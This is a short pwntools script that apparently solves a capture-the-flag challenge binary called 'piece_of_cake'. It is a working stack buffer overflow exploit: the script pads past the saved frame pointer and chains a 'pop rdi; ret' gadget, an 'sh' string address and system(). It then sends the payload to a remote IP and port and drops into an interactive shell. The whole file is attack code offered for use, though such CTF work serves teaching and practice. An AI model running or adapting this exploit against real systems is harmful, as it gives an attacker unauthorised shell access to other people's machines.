from pwn import *

BIN = './piece_of_cake'
context.binary = BIN

e = ELF(BIN)
# p = process(BIN)
r = remote('141.85.224.106', '31345')

buffer_offset = 0x20
old_rbp_size = 0x8

# We arrive at the return address by adding the buffer offset and the old rbp size
# Here we want to overwrite the return address with the address of a 'pop rdi; ret' gadget
# The rdi should be the address to the string "sh" and then ret should jump to the system function

gadget_addr = 0x000000000040124b
system_func_addr = 0x000000000040117f
sh = next(e.search(b'sh'))

payload = b''
payload += b'A' * (buffer_offset + old_rbp_size)
payload += p64(gadget_addr)
payload += p64(sh)
payload += p64(system_func_addr)

# p.sendline(payload)
# p.interactive()

r.sendline(payload)
r.interactive()
